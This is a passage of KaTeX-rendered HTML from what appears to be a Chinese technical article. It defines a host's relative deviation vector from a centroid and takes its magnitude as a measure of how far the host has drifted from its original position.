class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，表示特征点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和质心<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\beta_{t-1}(W)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span>的相对不同：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mfrac><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub><mo>−</mo><msub><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><mrow><msub><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac><mrow><msubsup><mi>x</mi><mi>t</mi><mn>1</mn></msubsup><mo>−</mo><msubsup><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>1</mn></msubsup><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><mrow><msubsup><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>1</mn></msubsup><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow></mfrac><mo separator="true">,</mo><mfrac><mrow><msubsup><mi>x</mi><mi>t</mi><mn>2</mn></msubsup><mo>−</mo><msubsup><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></msubsup><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><mrow><msubsup><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></msubsup><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow></mfrac><mo separator="true">,</mo><mfrac><mrow><msubsup><mi>x</mi><mi>t</mi><mn>3</mn></msubsup><mo>−</mo><msubsup><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>3</mn></msubsup><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><mrow><msubsup><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mn>3</mn></msubsup><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow></mfrac><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} \mathbf{m}_{t} &amp;=\frac{\mathbf{x}_{t}-\beta_{t-1}(W)}{\beta_{t-1}(W)} \\ &amp;=\left(\frac{x_{t}^{1}-\beta_{t-1}^{1}(W)}{\beta_{t-1}^{1}(W)}, \frac{x_{t}^{2}-\beta_{t-1}^{2}(W)}{\beta_{t-1}^{2}(W)}, \frac{x_{t}^{3}-\beta_{t-1}^{3}(W)}{\beta_{t-1}^{3}(W)}\right) \end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.484186em;vertical-align:-2.492093em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.992093em;"><span style="top:-5.07564em;"><span class="pstrut" style="height:3.510547em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.3290929999999994em;"><span class="pstrut" style="height:3.510547em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.492093em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.992093em;"><span style="top:-5.07564em;"><span class="pstrut" style="height:3.510547em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.3290929999999994em;"><span class="pstrut" style="height:3.510547em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5105469999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.795908em;"><span style="top:-2.433692em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3246389999999999em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.6964390000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999998em;"><span style="top:-2.451892em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30643899999999996em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0106389999999998em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5105469999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.795908em;"><span style="top:-2.433692em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3246389999999999em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.6964390000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999998em;"><span style="top:-2.451892em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30643899999999996em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0106389999999998em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5105469999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.795908em;"><span style="top:-2.433692em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3246389999999999em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.6964390000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999998em;"><span style="top:-2.451892em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30643899999999996em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0106389999999998em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.492093em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{m}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的定义，可以用来表述一个主机从它原先的位置偏离了多少。</p><p>最后，用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{m}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的模（magnitude）来表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">s_{t}^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>2</mn></msubsup><mo>=</mo><mrow><mo fence="true">∥</mo><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub><mo fence="true">∥</mo></mrow><mo>=</mo><msqrt><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mn>3</mn></msubsup><msup><mrow><mo fence="true">(</mo><mfrac><mrow><msubsup><mi>x</mi><mi>t</mi><mi>i</mi></msubsup><mo>−</mo><msubsup><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mi>i</mi></msubsup><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><mrow><msubsup><mi>β</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow><mi>i</mi></msubsup><mo stretchy="false">(</mo><mi>W</mi><mo stretchy="false">)</mo></mrow></mfrac><mo fence="true">)</mo></mrow><mn>2</mn></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">s_{t}^{2}=\left\|\mathbf{m}_{t}\right\|=\sqrt{\sum_{i=1}^{3}\left(\frac{x_{t}^{i}-\beta_{t-1}^{i}(W)}{\beta_{t-1}^{i}(W)}\right)^{2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∥</span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∥</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.44em;vertical-align:-0.8030060000000003em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6369939999999996em;"><span class="svg-align" style="top:-4.4em;"><span class="pstrut" style="height:4.4em;"></span><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.140845em;"><span style="top:-2.6188800000000003em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8158857142857143em;"><span style="top:-2.1884857142857146em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3710357142857143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.569725em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8158857142857143em;"><span style="top:-2.209457142857143em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29054285714285716em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8158857142857143em;"><span style="top:-2.1884857142857146em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3710357142857143em;"><span></span></span></span></span></span></span><span class="mopen 